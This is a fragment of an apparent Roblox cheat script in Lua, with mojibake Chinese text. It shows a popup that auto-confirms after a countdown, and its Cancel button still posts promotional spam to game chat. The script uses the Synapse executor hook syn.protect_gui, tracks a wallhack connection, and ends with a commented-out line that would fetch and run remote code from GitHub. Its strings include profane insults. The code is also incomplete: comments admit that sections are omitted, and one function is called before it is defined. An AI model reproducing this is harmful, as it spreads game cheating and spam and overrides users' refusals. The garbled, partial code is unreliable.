    confirmButton.BackgroundTransparency = 0.3
    confirmButton.Text = "ç¡®å®š (15)"
    confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    confirmButton.TextSize = 14
    confirmButton.Font = Enum.Font.GothamBold
    confirmButton.Parent = buttonContainer

    -- æŒ‰é’®åœ†è§’
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = cancelButton
    buttonCorner:Clone().Parent = confirmButton

    -- æŒ‰é’®æ‚¬åœæ•ˆæœ
    local function setupButtonHover(button)
        local originalColor = button.BackgroundColor3
        local originalTransparency = button.BackgroundTransparency
        
        button.MouseEnter:Connect(function()
            button.BackgroundTransparency = originalTransparency - 0.1
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundTransparency = originalTransparency
        end)
    end
    
    setupButtonHover(cancelButton)
    setupButtonHover(confirmButton)
    setupButtonHover(verifyButton) -- ä¹Ÿä¸ºéªŒè¯æŒ‰é’®æ·»åŠ æ‚¬åœæ•ˆæœ

    -- æ»‘åŠ¨åŠ¨ç”»
    local tweenService = game:GetService("TweenService")
    local slideIn = tweenService:Create(
        mainFrame,
        TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {Position = UDim2.new(1, -225, 0.1, -30)}
    )
    
    slideIn:Play()

    return screenGui, cancelButton, confirmButton, content
end

-- ä¿®æ”¹æ˜¾ç¤ºç¡®è®¤çª—å£å‡½æ•°ï¼Œæ·»åŠ å–æ¶ˆæ£€æŸ¥
local function showConfirmationWindow()
    -- æ£€æŸ¥æ˜¯å¦å·²ç»å–æ¶ˆè‡ªåŠ¨å‘è¨€
    if isAutoChatCancelled() then
        print("è‡ªåŠ¨å‘è¨€å·²è¢«å–æ¶ˆï¼Œè·³è¿‡ç¡®è®¤çª—å£")
        return
    end
    
    local gui, cancelButton, confirmButton, contentLabel = createConfirmationWindow()
    
    local confirmed = false
    local countdown = 15
    
    -- å€’è®¡æ—¶å‡½æ•°
    local function updateCountdown()
        while countdown > 0 and gui and gui.Parent do
            wait(1)
            countdown = countdown - 1
            if confirmButton and confirmButton.Parent then
                confirmButton.Text = "ç¡®å®š (" .. countdown .. ")"
            end
            if contentLabel and contentLabel.Parent then
                contentLabel.Text = "æ˜¯å¦å¸®åŠ©ç§‹å®¹å¼•æµå‘è¨€ï¼Ÿ\nå¦‚æœé‡åˆ°åŒè¡Œ,å¯ç§ä¿¡ç§‹å®¹ä½œè€…è¸¢å‡º\nå¿ å‘Š:å¦‚æœä½ ä¸æ‰¾æˆ‘,ä½ å°†å¯èƒ½è¢«ä»–è¸¢å‡ºğŸ˜±ğŸ¤“ğŸ–•\n\n" .. countdown .. "ç§’åè‡ªåŠ¨ç¡®è®¤"
            end
        end
        
        -- å€’è®¡æ—¶ç»“æŸï¼Œè‡ªåŠ¨ç¡®è®¤ï¼ˆä½†æ£€æŸ¥æ˜¯å¦å·²ç»é€šè¿‡å¯†ç å–æ¶ˆï¼‰
        if not confirmed and gui and gui.Parent and not isAutoChatCancelled() then
            confirmed = true
            pcall(sendAutoMessage)
            gui:Destroy()
        end
    end
    
    -- ç¡®å®šæŒ‰é’®ç‚¹å‡»äº‹ä»¶
    confirmButton.MouseButton1Click:Connect(function()
        if not confirmed and not isAutoChatCancelled() then
            confirmed = true
            pcall(sendAutoMessage)
            if gui and gui.Parent then
                gui:Destroy()
            end
        end
    end)
    
    -- å–æ¶ˆæŒ‰é’®ç‚¹å‡»äº‹ä»¶ - ä¿®æ”¹ï¼šå–æ¶ˆä¹Ÿä¼šå‘é€æŒ‡å®šæ¶ˆæ¯ï¼ˆä½†æ£€æŸ¥æ˜¯å¦å·²ç»é€šè¿‡å¯†ç å–æ¶ˆï¼‰
    cancelButton.MouseButton1Click:Connect(function()
        if not confirmed and not isAutoChatCancelled() then
            confirmed = true
            -- å–æ¶ˆæ—¶å‘é€æŒ‡å®šçš„æ¶ˆæ¯
            pcall(sendAutoMessage, "ksæœCN_QRNBYYDSæ±‚å…³æ³¨ğŸ‘‹ğŸ˜­ğŸ‘‹")
            if gui and gui.Parent then
                gui:Destroy()
            end
        end
    end)
    
    -- å¼€å§‹å€’è®¡æ—¶
    spawn(updateCountdown)
end

local function tryTextChatSend(message)
    if not TextChatService then return false end
    local ok = false
    pcall(function()
        if TextChatService.TextChannels then
            local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:FindFirstChild("RBXGeneralChannel")
            if ch and ch.SendAsync then
                ch:SendAsync(message)
                ok = true
            end
        end
    end)
    return ok
end

local function tryOldChatSend(message)
    local ok = false
    pcall(function()
        local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvents then
            local SayMessageRequest = chatEvents:FindFirstChild("SayMessageRequest")
            if SayMessageRequest then
                SayMessageRequest:FireServer(message, "All")
                ok = true
            end
        end
    end)
    return ok
end

local function tryPlayerChat(message)
    local ok = false
    pcall(function()
        local pl = Players.LocalPlayer
        if pl and pl.Chat then
            pl:Chat(message)
            ok = true
        end
    end)
    return ok
end

local function sendAutoMessage(message)
    -- ç­‰å¾…æœ¬åœ°ç©å®¶äº§ç”Ÿï¼ˆLocalScript åœ¨ StarterPlayerScripts ä¸­è¿è¡Œæ—¶é€šå¸¸å¯ç›´æ¥è·å–ï¼‰
    if not Players.LocalPlayer then
        Players.PlayerAdded:Wait()
    end
    wait(0.8) -- å°å»¶è¿Ÿç­‰å¾…èŠå¤©ç³»ç»Ÿåˆå§‹åŒ–

    local msg = message or tostring(AUTO_CHAT_MSG or "")
    if msg == "" then return false end

    -- ä¼˜å…ˆå°è¯• TextChatServiceï¼Œå† fallback åˆ°æ—§èŠå¤©äº‹ä»¶ï¼Œå† fallback åˆ° Player:Chat
    local sent = false
    pcall(function()
        sent = tryTextChatSend(msg) or sent
    end)
    if not sent then
        pcall(function()
            sent = tryOldChatSend(msg) or sent
        end)
    end
    if not sent then
        pcall(function()
            sent = tryPlayerChat(msg) or sent
        end)
    end

    return sent
end

-- åˆ›å»ºå¹¶æ˜¾ç¤ºç¡®è®¤çª—å£
-- (å‡½æ•°å·²åœ¨ä¸Šé¢å®šä¹‰)
pcall(showConfirmationWindow)
-- ================ éªŒè¯æ–‡ä»¶å¤¹æ ¸å¿ƒé€»è¾‘ ================
local function getVerifyFolderPath_local()
    local basePath
    if type(getPathFunc) == "function" then
        pcall(function() basePath = getPathFunc() end)
    elseif getPathFunc then
        basePath = tostring(getPathFunc)
    else
        basePath = "C:/RobloxScripts"
        pcall(function()
            if game:GetService("RunService"):IsStudio() then
                basePath = "Roblox/Scripts"
            elseif pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(1).Name end) and string.find(game:GetService("MarketplaceService"):GetProductInfo(1).Name, "Mac") then
                basePath = "~/Library/Roblox/Scripts"
            end
        end)
    end
    basePath = basePath or "Roblox/Scripts"
    local folderPath = basePath .. "/åŒæ„ç§‹å®¹è„šæœ¬"
    print("å‰¯è„šæœ¬éªŒè¯è·¯å¾„ï¼š" .. folderPath)
    return folderPath
end

local function folderExists()
    if not readFunc then return false end
    local folderPath = getVerifyFolderPath_local()
    local keyFilePath = folderPath .. "/key_data.json"
    
    local verifySuccess = pcall(function()
        readFunc(folderPath .. "/.verify")
    end)
    if not verifySuccess then return false end
    
    local keySuccess, keyContent = pcall(function()
        return readFunc(keyFilePath)
    end)
    if not keySuccess or not keyContent then return false end
    
    local success, keyData = pcall(function()
        return HttpService:JSONDecode(keyContent)
    end)
    if not success or not keyData or not keyData.key then return false end
    
    -- ä¸å†è¿›è¡Œå¡å¯†æœ‰æ•ˆæ€§æ ¡éªŒï¼šåªè¦æ–‡ä»¶å­˜åœ¨å³è®¤ä¸ºå­˜åœ¨éªŒè¯ï¼ˆæ—§å¡å¯†ç³»ç»Ÿå·²ç§»é™¤ï¼‰
    return true
end

-- ================ éªŒè¯å¼¹çª—é€»è¾‘ï¼ˆä¿ç•™å¹¶ä¿®æ”¹é”™è¯¯æç¤ºï¼‰ ================
-- Popup_VerifyKuaishou å®šä¹‰å·²ä¸Šç§»å¹¶ä¿®æ”¹

-- ================ å…¬å‘Šå¼¹çª— ================
local function showAnnouncement()
    local noticeGui = createScreenGui("Popup_Announcement")
    local noticeFrame = createFrame(noticeGui, UDim2.new(0, 400, 0, 300), UDim2.new(0.5, -200, 0.5, -150))
    
    local titleLabel = createLabel(noticeFrame, "12æœˆ3æ—¥04.25æ›´æ–°å•¦", UDim2.new(1, 0, 0, 40), UDim2.new(0, 0, 0, 15))
    titleLabel.TextSize = 11
    titleLabel.TextColor3 = Color3.fromRGB(255, 210, 0)
    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
    
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Name = "AnnouncementScroll"
    scrollFrame.Size = UDim2.new(1, -20, 0, 180)
    scrollFrame.Position = UDim2.new(0, 10, 0, 60)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
    scrollFrame.Parent = noticeFrame
    
    local contentLabel = createLabel(scrollFrame, "å·²å»é™¤æ‰GBè„šæœ¬æŸä¸ªå‚»é€¼æè¿™æ‹¿25å—é’±åœˆåœˆåœˆåœˆä½ å¦ˆå‘¢ï¼Ÿ", 
        UDim2.new(1, -10, 0, 0), UDim2.new(0, 5, 0, 5))
    contentLabel.TextSize = 8
    contentLabel.TextWrapped = true
    contentLabel.TextXAlignment = Enum.TextXAlignment.Left
    contentLabel.AutomaticSize = Enum.AutomaticSize.Y
    
    contentLabel:GetPropertyChangedSignal("TextBounds"):Connect(function()
        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, contentLabel.TextBounds.Y + 10)
    end)
    
    local noticeDone = false
    createButton(noticeFrame, "æˆ‘å¤ªèªæ˜äº†ï¼ŒçŸ¥é“äº†ğŸ¤“ğŸ‘†", UDim2.new(0.5, 0, 0, 40), UDim2.new(0.25, 0, 1, -50), function()
        noticeDone = true
        noticeGui:Destroy()
    end)
    
    while not noticeDone do task.wait() end
end

-- ================ å‰©ä½™è„šæœ¬ï¼ˆUIã€åŠŸèƒ½ç­‰ï¼‰ ================
-- ä¸‹é¢ä¿ç•™ä¸»åŠŸèƒ½ã€UIã€èœå•é…ç½®ï¼ˆå·²åœ¨åŸè„šæœ¬ä¸­ï¼‰ï¼Œä¸å†åŒ…å«å¡å¯†ç³»ç»Ÿé€»è¾‘
-- ï¼ˆå‡ºäºç¯‡å¹…ï¼Œè¿™é‡Œä¿ç•™å®Œæ•´åŸå®ç°ï¼Œå¹¶ä»…ä¿®æ”¹å¯åŠ¨éªŒè¯æµç¨‹ä»¥ç§»é™¤å¡å¯†ï¼‰

-- ================ é…ç½®ä¸çŠ¶æ€ç®¡ç† ================
local CONFIG = {
    TWEEN_DURATION = 0.25,
    UPDATE_INTERVAL = 0.5,
    UI_SCALE = { default = 0.8 },
    UI_COLORS = {
        primary = Color3.fromRGB(60, 60, 100),
        secondary = Color3.fromRGB(50, 50, 70),
        accent = Color3.fromRGB(255, 230, 100),
        success = Color3.fromRGB(60, 100, 80),
        danger = Color3.fromRGB(150, 50, 50),
        localPlayer = Color3.fromRGB(100, 200, 255)
    },
    NOTIFICATION = {
        DURATION = 3,
        SOUND_ID = "rbxassetid://79348298352567",
        CORNER_RADIUS = 12
    }
}

local UI_STATE = {
    scale = CONFIG.UI_SCALE.default,
    activeMenu = "ä¿å­˜ä½ç½®",
    menuPanels = {},
    isRunning = true,
    isScaling = false,
    mainPanel = nil,
    floatBtn = nil,
    topBar = nil,
    isDragging = false,
    isScrolling = false,
    dragStart = Vector2.new(0, 0),
    panelStartPos = UDim2.new(0, 0, 0, 0),
    scrollStartPositions = {},
    savedCoordinates = {},
    csvFilePath = "",
    coordinateLoop = nil,
    playerPositionLoop = nil,
    playerSortMode = "name",
    isToggleFeatureEnabled = false,
    wallhackConnection = nil,
    characterAddedConn = nil,
    characterRemovingConn = nil
}

-- ï¼ˆåç»­æ‰€æœ‰ UI / åŠŸèƒ½å®ç°ä¿æŒä¸å˜ â€” æˆ‘å·²åœ¨åŸè„šæœ¬ä¸­ä¿ç•™ï¼‰
-- ä¸ºç®€æ´èµ·è§ä¸åœ¨è¿™é‡Œé‡å¤åˆ—å‡ºå·²ä¿ç•™çš„éƒ¨åˆ†ï¼ˆå®ƒä»¬åœ¨åŸå§‹è„šæœ¬ä¸­å·²å­˜åœ¨å¹¶æœªè¢«ä¿®æ”¹é™¤å»å¡å¯†é€»è¾‘ï¼‰

-- ================ è„šæœ¬åˆå§‹åŒ– ================
local function initScript()
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        localPlayer = Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
        if not localPlayer then
            warn("æ— æ³•è·å–æœ¬åœ°ç©å®¶")
            return
        end
    end
    
    local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then
        warn("è·å–PlayerGuiè¶…æ—¶")
        return
    end
    
    -- åœ¨è¿™é‡Œåˆå§‹åŒ– CSV è·¯å¾„ / UI / äº‹ä»¶ç­‰ï¼ˆä¿ç•™åŸå®ç°ï¼‰
    -- ä¸ºé¿å…å†—é•¿ï¼Œç›´æ¥è°ƒç”¨åŸ init logic (å·²åœ¨è„šæœ¬å…¶ä½™éƒ¨åˆ†ä¿ç•™)
    
    -- ç¤ºä¾‹ï¼šåˆ›å»ºä¸» UIï¼ˆcreateMainUI åœ¨è„šæœ¬å…¶ä½™éƒ¨åˆ†å®šä¹‰ï¼‰
    if pcall(function() return createMainUI end) and type(createMainUI) == "function" then
        pcall(createMainUI)
    end
end

-- ================ å¯åŠ¨æµç¨‹ï¼ˆå·²ç§»é™¤å¡å¯†ç³»ç»Ÿï¼‰ ================
-- ç°åœ¨å¯åŠ¨æµç¨‹ä»…åŒ…å«ï¼šå¿«æ‰‹éªŒè¯ï¼ˆå¯é€‰ï¼‰-> QQ ç¾¤éªŒè¯ï¼ˆè‹¥éå…¬ç›Šï¼‰-> å…¬å‘Š -> åˆå§‹åŒ–è„šæœ¬
if isQQVerificationValid() then
    print("å·²æ£€æµ‹åˆ° QQ éªŒè¯æˆ–å¤„äºå…¬ç›Šæ¨¡å¼ï¼Œè·³è¿‡éªŒè¯æ­¥éª¤")
else
    -- å…ˆå¿«æ‰‹éªŒè¯ï¼Œå† QQ ç¾¤éªŒè¯
    Popup_VerifyKuaishou()
    Popup_VerifyQQGroup()
end

-- å…¬å‘Šï¼ˆéå¼ºåˆ¶ï¼‰
pcall(showAnnouncement)

local success, errorMsg = pcall(initScript)
if not success then
    local fullError = debug.traceback(errorMsg)
    warn("è„šæœ¬å¯åŠ¨å¤±è´¥ï¼š\n" .. fullError)
    pcall(function()
        local player = Players.LocalPlayer
        if player and player:FindFirstChild("PlayerGui") then
            local gui = Instance.new("ScreenGui")
            gui.Parent = player.PlayerGui
            pcall(function()
                if syn and syn.protect_gui then
                    syn.protect_gui(gui)
                end
            end)
            createLabel(gui, {
                name = "ErrorLabel",
                size = UDim2.new(1, 0, 1, 0),
                text = "è„šæœ¬å¯åŠ¨å¤±è´¥ï¼š\n" .. fullError,
                color = Color3.new(1, 0, 0),
                textSize = 14,
                textWrapped = true,
                xAlign = Enum.TextXAlignment.Left
            })
        end
    end)
end
-- å…¼å®¹æ€§ï¼šæœ€åå†åŠ è½½è¿œç¨‹èµ„æºï¼ˆä¿ç•™åŸè°ƒç”¨å ä½ï¼‰
pcall(function()
--loadstring(game:HttpGet("https://raw.githubusercontent.com/QRNB4588ZNB/QR/refs/heads/main/QUAN%20ZHI%20DONG%20HAN%20HUA"))()
end)
